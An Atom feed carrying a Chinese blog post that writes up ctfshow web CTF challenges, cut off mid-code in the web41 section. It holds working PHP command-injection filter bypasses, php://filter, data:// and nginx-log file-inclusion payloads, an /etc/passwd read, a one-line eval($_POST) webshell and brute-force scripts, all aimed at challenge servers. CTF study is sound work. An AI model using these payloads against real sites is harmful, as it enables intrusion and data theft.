<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Disda</title>
  
  <subtitle>Disda’s Dairy</subtitle>
  <link href="https://disda-coding.github.io/atom.xml" rel="self"/>
  
  <link href="https://disda-coding.github.io/"/>
  <updated>2023-04-27T08:41:49.194Z</updated>
  <id>https://disda-coding.github.io/</id>
  
  <author>
    <name>Disda</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ctfshow</title>
    <link href="https://disda-coding.github.io/2023/04/19/ctfshow/"/>
    <id>https://disda-coding.github.io/2023/04/19/ctfshow/</id>
    <published>2023-04-19T09:51:30.000Z</published>
    <updated>2023-04-27T08:41:49.194Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#web%E5%85%A5%E9%97%A8">WEB入门</a><ul><li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a><ul><li><a href="#web05">web05</a></li><li><a href="#web10">web10</a></li><li><a href="#web12">web12</a></li><li><a href="#web13">web13</a></li><li><a href="#web14">web14</a></li><li><a href="#web15">web15</a></li><li><a href="#web16">web16</a></li><li><a href="#web20">web20</a></li></ul></li><li><a href="#%E7%88%86%E7%A0%B4">爆破</a><ul><li><a href="#web21">web21</a></li><li><a href="#web22">web22</a></li><li><a href="#web23">web23</a></li><li><a href="#web25">web25</a></li><li><a href="#web28">web28</a></li></ul></li><li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">命令执行</a><ul><li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB">命令执行方法汇总</a></li><li><a href="#web37">web37</a></li><li><a href="#web41">web41</a></li><li><a href="#%E5%91%BD%E4%BB%A4%E6%88%AA%E6%96%AD">命令截断</a></li><li><a href="#web54">web54</a></li><li><a href="#web55">web55</a></li></ul></li></ul></li><li><a href="#%E6%84%9A%E4%BA%BA%E8%8A%82%E6%9D%AF">愚人节杯</a><ul><li><a href="#web">WEB</a><ul><li><a href="#easy_signin">easy_signin</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="web入门">WEB入门</span></h1><h3><span id="信息收集">信息收集</span></h3><h4><span id="web05">web05</span></h4><p>phps泄露，phps存放着php<a href="https://so.csdn.net/so/search?q=%E6%BA%90%E7%A0%81&spm=1001.2101.3001.7020">源码</a>,可通过尝试访问&#x2F;index.phps读取,或者尝试扫描工具扫描读取。</p><h4><span id="web10">web10</span></h4><p>flag信息藏在dns记录里面，使用命令</p><p><a href="http://dbcha.com/">域名查询</a></p><h4><span id="web12">web12</span></h4><ul><li><p>有时候访问路径在*&#x2F;robots.txt*里面</p></li><li><p>常见的管理员页面路径：</p><ul><li>&#x2F;admin.php</li><li>&#x2F;admin</li></ul></li></ul><h4><span id="web13">web13</span></h4><p>题目提示了要查看文档，f12粗略看了一下，没什么线索。</p><p>通过dirsearch也扫不到，看了一下提示，说是要查看网页源代码，然后查找一下document关键字，果然发现了个document.pdf。</p><h4><span id="web14">web14</span></h4><p>看了半天源码也没看到什么东西，看了一下robots.txt也没有，再用dirsearch扫一下，发现有个editor目录，访问链接发现了一个编辑器。</p><p>然后利用编辑器上传的功能，发现flag文件<code>editor/attached/file/var/www/html/nothinghere/fl000g.txt</code></p><p>最后访问**&#x2F;nothinghere&#x2F;fl000g.txt**即可</p><h4><span id="web15">web15</span></h4><p>要有社工的意识，有邮箱的信息就可以去查其他信息。</p><h4><span id="web16">web16</span></h4><p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加&#x2F;tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</p><ul><li>chrome的wappalyzer可以查看网页的框架和语言，可以发现是php</li></ul><h4><span id="web20">web20</span></h4><ul><li>access数据库在&#x2F;db&#x2F;db.mdb</li></ul><h3><span id="爆破">爆破</span></h3><h4><span id="web21">web21</span></h4><p>BurpSuit可以有多种做法：</p><p>我们随便输入账号密码抓包时候发现Authorization中是以base64进行加密的，解密为admin:123，可能这样还比较难看出来，可以把密码加长一点试试看。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>02cc98c2-f4b7-41b3-8b16-7b9a96655edb.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46MTIz</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><ul><li><p>第一种，账号密码分开。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic §§§§</span><br></pre></td></tr></table></figure><p><img src="/2023/04/19/ctfshow/disda/Desktop/Disda/hexo/source/_posts/ctfshow/image-20230423162915401.png" alt="image-20230423162915401"></p></li></ul><p>​     <img src="/2023/04/19/ctfshow/disda/Desktop/Disda/hexo/source/_posts/ctfshow/image-20230423162935303.png" alt="image-20230423162935303"></p><p>第二个位置加入密码本，然后其他同理。</p><p><img src="/2023/04/19/ctfshow/disda/Desktop/Disda/hexo/source/_posts/ctfshow/image-20230423162626843.png" alt="image-20230423162626843"></p><ul><li><p>方法二：可以直接保留admin:的base64编码，然后放在payload前面</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46§§</span><br></pre></td></tr></table></figure></li></ul><p>​因此，只需要一个simple list即可</p><ul><li>方法三：我们还可以使用<em>payload type &#x3D; Custom iterator</em>构造三次参数<ul><li>第一次输入admin</li><li>第二次输入:</li><li>第三次密码字典</li></ul></li></ul><h4><span id="web22">web22</span></h4><p><a href="http://z.zcjun.com/">子域名爆破</a></p><h4><span id="web23">web23</span></h4><p>阅读php源码，然后写python脚本</p><ul><li><strong>MD5加密</strong>：产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致。生成结果是固定的128字节，通常用一个32位的16进制字符串表示。</li><li><strong>PHP</strong>：substr()、intval()、以及代码分析</li></ul><p>第一种方式，字母加数字组合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">s = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">url = <span class="string">&#x27;http://7f0d474e-c019-4af7-8f95-b02664aa0411.challenge.ctf.show/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        k = (<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)).encode(<span class="string">&#x27;utf-8&#x27;</span>)    <span class="comment"># python3中必须进行utf-8编码</span></span><br><span class="line">        token = hashlib.md5(k).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> token[<span class="number">1</span>] == token[<span class="number">14</span>] <span class="keyword">and</span> token[<span class="number">14</span>] == token[<span class="number">17</span>]:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                left = <span class="built_in">int</span>(<span class="built_in">int</span>(token[<span class="number">1</span>])+<span class="built_in">int</span>(token[<span class="number">14</span>])+<span class="built_in">int</span>(token[<span class="number">17</span>])/<span class="built_in">int</span>(token[<span class="number">1</span>]))</span><br><span class="line">                right = <span class="built_in">int</span>(token[<span class="number">31</span>])</span><br><span class="line">                <span class="keyword">if</span> left == right:</span><br><span class="line">                    <span class="built_in">print</span>(requests.get(url+<span class="string">f&#x27;/?token=<span class="subst">&#123;<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)&#125;</span>&#x27;</span>).text)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>第二种方式，纯数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://61535773-6957-4813-b084-0451f6607922.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">    k = <span class="built_in">str</span>(j).encode(<span class="string">&#x27;utf-8&#x27;</span>)    <span class="comment"># python3中必须进行utf-8编码</span></span><br><span class="line">    token = hashlib.md5(k).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> token[<span class="number">1</span>] == token[<span class="number">14</span>] <span class="keyword">and</span> token[<span class="number">14</span>] == token[<span class="number">17</span>]:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            left = <span class="built_in">int</span>(<span class="built_in">int</span>(token[<span class="number">1</span>])+<span class="built_in">int</span>(token[<span class="number">14</span>])+<span class="built_in">int</span>(token[<span class="number">17</span>])/<span class="built_in">int</span>(token[<span class="number">1</span>]))</span><br><span class="line">            right = <span class="built_in">int</span>(token[<span class="number">31</span>])</span><br><span class="line">            <span class="keyword">if</span> left == right:</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(requests.get(url+<span class="string">f&#x27;/?token=<span class="subst">&#123;j&#125;</span>&#x27;</span>).text)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h4><span id="web25">web25</span></h4><ul><li><p>和上一题一样，都是利用php随机数的爆破攻击，但是本题没有给种子，因此需要需要使用工具 <a href="https://www.openwall.com/php_mt_seed/">php_mt_seed</a> 。专门用来跑mt_srand()种子和 mt_rand()随机数。</p><p><img src="/2023/04/19/ctfshow/disda/Desktop/Disda/hexo/source/_posts/ctfshow/509478bc7d684369b08ac08f664cf67b.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">种子涉及到flag，不能直接求到</span><br><span class="line"><span class="keyword">if</span>((!<span class="variable">$rand</span>)) 要使这个为真，就要让 <span class="variable">$rand</span>=<span class="number">0</span> ，</span><br><span class="line">而 <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()) </span><br><span class="line">所以要得到随机数才能构造 <span class="variable">$r</span>=<span class="variable">$mt_rand</span>() 。</span><br></pre></td></tr></table></figure><p>先传参<code>/?r=0</code>获取生成随机数的负值。</p><p>再进行<code>./php_mt_seed 随机数</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1267174464</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span>=<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把r&#x3D;1267174464和token放到cookie中传入，即可获取flag。</p></li></ul><h4><span id="web28">web28</span></h4><ul><li><p>一开始三个位置一起爆破，没成功，看网上wp</p><p>如果修改最后的2.txt会被无限重定向，不删除2.txt只修改前面的0和1依旧会被无限重定向。</p></li><li><p>因此删掉最后2.txt，用集束炸弹模式爆破前两个数字即可。</p></li></ul><h3><span id="命令执行">命令执行</span></h3><h4><span id="命令执行方法汇总">命令执行方法汇总</span></h4><p>但是假如我们并不知道flag在哪里呢？<br>新手可以等文件包含部分学过来再学。 我们通过响应头，发现是nginx，默认nginx日志文件在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 结合这里的include，构造如下语句，也可以尝试先&#x2F;etc&#x2F;passwd，确认的确可以包含。<code> http://dfa0bafe-3571-4a4a-9f0a-3766fb5a0a69.challenge.ctf.show/?c=include$_GET[a\]?%3E&amp;a=../../../../var/log/nginx/access.log</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>() <span class="comment">#是PHP中一个常用的函数，用于检查变量是否已经被设置并且非 NULL。如果给定的变量存在且其值不为 NULL，则返回 true，否则返回 false</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>() <span class="comment">#是PHP中用于执行正则表达式匹配的函数，它可以在给定的字符串中查找模式匹配，如果匹配成功，返回 1，否则返回 0。该函数需要传入两个参数：正则表达式模式和要搜索的字符串。还可以传递第三个参数，将匹配结果存储到其中。</span></span><br><span class="line"><span class="keyword">eval</span>() <span class="comment">#函数用于将字符串作为PHP代码执行。在执行时，该函数将传递的字符串作为 PHP 代码来执行。</span></span><br></pre></td></tr></table></figure><p>因为我们传入的参数能被当作php代码执行，则我们使用一些系统指令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>tac可以直接看到，cat需要在f12源码里面看</li></ul><blockquote><p>空格可以用tab%09来绕过</p><p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS、$IFS$1</p><p>对于;的过滤可以使用?&gt;</p><p>%0a 换行符代替 ;</p></blockquote><ul><li><p>方法一：拼接</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># url编码后使用%5c添加到flag中</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl%<span class="number">5</span>cag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># url编码后使用$9添加到flag中</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl$<span class="number">9</span>ag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># 还可以使用&#x27;&#x27;和&quot;&quot;来拼接flag 例如 fl&#x27;&#x27;ag （编不编码都试试看）</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl%<span class="number">22</span>%<span class="number">22</span>ag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># 使用特殊符号$@</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl$@ag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># 过滤cat后也可以通过加斜杠达到绕过的方法 ca\t</span></span><br></pre></td></tr></table></figure></li><li><p>方法二：使用通配符</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用* cat fla*</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fla*%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># 使用? cat fla?.php</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fla%<span class="number">3</span>F%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># ?可以出现任意次</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>tac%<span class="number">20</span>fla?.???%<span class="number">27</span>);</span><br></pre></td></tr></table></figure></li><li><p>方法三：使用反引号</p><ul><li>反引号的作用就是将反引号内的Linux命令先执行，然后将执行结果赋予变量。</li><li>由 <code>&#39;&#39;</code> 符号并不会影响命令的执行，所以我们可以插入这些符号来绕过。在linux中可以使用 ’ 来绕过，比如 fl’’ag 就等效于 flag。</li><li><strong>echo &#96;&#96; 和 system(‘’) 等价</strong></li></ul>  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?c=<span class="built_in">echo</span><span class="variable">%20`tac%</span><span class="number">20</span>fl<span class="variable">%27%</span><span class="number">27</span>ag.php`;</span><br><span class="line"># nl 命令：Linux中nl命令和cat命令很像，不过nl命令会打上行号，nl没有回显，需要f12查看源代码</span><br><span class="line">/?c=<span class="built_in">echo</span> `nl fl?g.php`;</span><br><span class="line"># 此外也可以用&#x27;&#x27;来绕过过滤</span><br><span class="line"><span class="built_in">echo</span> `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br></pre></td></tr></table></figure></li><li><p>方法四：复制大法</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cp fla* 1.txt,然后访问目录下的1.txt即可</span></span><br><span class="line">?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cp%<span class="number">20</span>fla*%<span class="number">201</span>.txt%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># 同理，如果屏蔽system，也可以使用exec</span></span><br><span class="line">?c=<span class="title function_ invoke__">exec</span>(%<span class="number">27</span>cp%<span class="number">20</span>fla*%<span class="number">201</span>.txt%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># 同理还有passthru</span></span><br><span class="line">/?c=<span class="title function_ invoke__">passthru</span>(%<span class="number">27</span>cp%<span class="number">20</span>fla*%<span class="number">201</span>.txt%<span class="number">27</span>);</span><br></pre></td></tr></table></figure></li><li><p>方法五：利用参数输入+eval</p><ul><li>由于系统只会检测$c中的内容，则我们通过eval()函数构造参数1巧妙绕过</li></ul>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</span></span><br><span class="line">/?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>tac%<span class="number">20</span>flag.php%<span class="number">27</span>);</span><br></pre></td></tr></table></figure></li><li><p>方法六：文件包含</p><ul><li>使用include将1包含进来，1再使用php伪协议使用PHP内部设置的过滤器，将flag.php文件读取并以base64编码的格式返回</li></ul>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其中$_GET也可以改成$_REQUEST</span></span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>];&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">require</span> <span class="variable">$_GET</span>[<span class="number">1</span>];&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[a];&amp;a=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>方法七：一句话木马</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure></li><li><p>方法八：</p><blockquote><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。<br>pos() 函数返回数组中当前元素（指针指向）的值。<br>scandir() 函数返回指定目录中的文件和数组。<br>array_reverse() 将数组倒序输出。<br>next() 将指针指向数组的下一个元素并输出。<br>show_source() 对文件进行语法高亮显示，是highlight_file()别名。</p></blockquote>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"><span class="comment"># 等价</span></span><br><span class="line">?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br><span class="line"><span class="comment"># 其中show_source可以换成highlight_file和readfile</span></span><br></pre></td></tr></table></figure><blockquote><p>所以，语句的步骤是<br>先拿到一个.&#x3D;&#x3D;》localeconv() pos()</p><p>接着扫描.目录，即当前目录&#x3D;&#x3D;》scandir()</p><p>将扫描完的目录倒叙&#x3D;》array_reverse(),因为正序第一第二分别是: . ..</p><p>将倒序完毕的数组的第二个元素输出&#x3D;&#x3D;》next() </p><p>​- 因为目录的顺序分别是. .. flag.php index.php因此我们倒序后第二个是flag.php</p><p>打印文件信息&#x3D;&#x3D;》show_source()</p></blockquote></li><li><p>方法九：</p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">RCE</a> </p><ul><li><p>可以通过</p><ul><li>$_GET</li><li>$_POST</li><li>$_FILES</li><li>$_COOKIE</li></ul><p><code>?c=eval(end(current(get_defined_vars())));&amp;a=system(&quot;cat flag.php&quot;);</code></p></li></ul></li></ul><h4><span id="web37">web37</span></h4><ul><li><p>知识点</p><ul><li>考察data协议</li></ul></li><li><p>data伪协议：将后面的字符当做PHP代码执行</p><p>data:&#x2F;&#x2F;，类似php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p><p><code>?c=data://text/plain;base64,[base64_encode_shell]</code></p><p>看源代码，因为flag.php注释注释了flag，所以看不见，需要查看源代码也可以使用tac来读取，破坏php的注释规则，就可以直接在页面上看见flag了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 05:18:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>题解</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&lt;?php system(&#x27;cat flag.php&#x27;);?&gt;</span></span><br><span class="line">/?c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web41">web41</span></h4><p>这个题过滤了<code>$、+、-、^、~</code>使得<strong>异或自增和取反</strong>构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符<code>|</code>。<br>我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。</p><p>从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成可用字符的集合</span></span><br><span class="line"><span class="comment"># rce_or.php</span></span><br><span class="line"><span 